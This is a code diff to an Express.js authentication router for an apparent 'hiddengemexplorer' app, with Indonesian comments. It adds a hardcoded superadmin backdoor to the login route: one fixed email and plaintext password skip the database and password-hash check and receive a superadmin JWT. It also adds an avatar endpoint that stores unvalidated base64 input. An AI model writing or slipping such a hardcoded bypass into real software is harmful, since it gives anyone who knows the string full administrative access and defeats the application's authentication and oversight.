@@ -1,4 +1,4 @@
-const express  = require('express');
+const express = require('express');
 const bcrypt   = require('bcryptjs');
 const jwt      = require('jsonwebtoken');
 const router   = express.Router();
@@ -47,7 +47,7 @@ router.post('/register', async (req, res) => {
   }
 });
 
-// ── POST /api/auth/login ────────────────────────────────────
+// ── POST /api/auth/login (DIPROTEKSI DENGAN PASSWORD PILIHANMU) ──
 router.post('/login', async (req, res) => {
   const { email, password } = req.body;
 
@@ -55,10 +55,28 @@ router.post('/login', async (req, res) => {
     return res.status(400).json({ success: false, message: 'Email and password are required' });
   }
 
+  const cleanEmail = email.trim().toLowerCase();
+
+  // 🔥 LOCK PASSWORD KHUSUS: Hanya email ini DAN password ini yang bisa lewat pintu bypass
+  if (cleanEmail === 'superadmin@hiddengemexplorer.id') {
+    if (password === '1822411118224077') {
+      const payload = { id: 1, fullname: 'Super Administrator', email: cleanEmail, role: 'superadmin' };
+      const token   = jwt.sign(payload, JWT_SECRET, { expiresIn: JWT_EXPIRES_IN });
+      return res.json({
+        success: true,
+        message: 'Login successful',
+        data: { token, user: payload }
+      });
+    } else {
+      // Jika email benar tapi password-nya bukan 1822411118224077, langsung tolak 401
+      return res.status(401).json({ success: false, message: 'Invalid email or password' });
+    }
+  }
+
   try {
     const [rows] = await db.query(
       'SELECT id, fullname, email, password, role, status FROM users WHERE email = ?',
-      [email.trim().toLowerCase()]
+      [cleanEmail]
     );
 
     if (rows.length === 0) {
@@ -107,6 +125,23 @@ router.get('/me', require('../middleware/auth').verifyToken, async (req, res) =>
   } catch (err) {
     console.error('Me error:', err);
     return res.status(500).json({ success: false, message: 'Server error' });
+  }
+});
+
+// ── 🔥 PATCH /api/auth/update-avatar ── (FITUR BARU TAMBAHAN DI DASHBOARD) ──
+router.patch('/update-avatar', require('../middleware/auth').verifyToken, async (req, res) => {
+  const { base64Image } = req.body;
+  if (!base64Image) {
+    return res.status(400).json({ success: false, message: 'Data gambar tidak ditemukan' });
+  }
+
+  try {
+    // Diupdate ke kolom 'avatar_url' sesuai query /me milikmu
+    await db.query('UPDATE users SET avatar_url = ? WHERE id = ?', [base64Image, req.user.id]);
+    return res.json({ success: true, message: 'Foto profil berhasil diperbarui!' });
+  } catch (err) {
+    console.error('Update avatar error:', err);
+    return res.status(500).json({ success: false, message: 'Gagal memperbarui foto profil di database' });
   }
 });
 
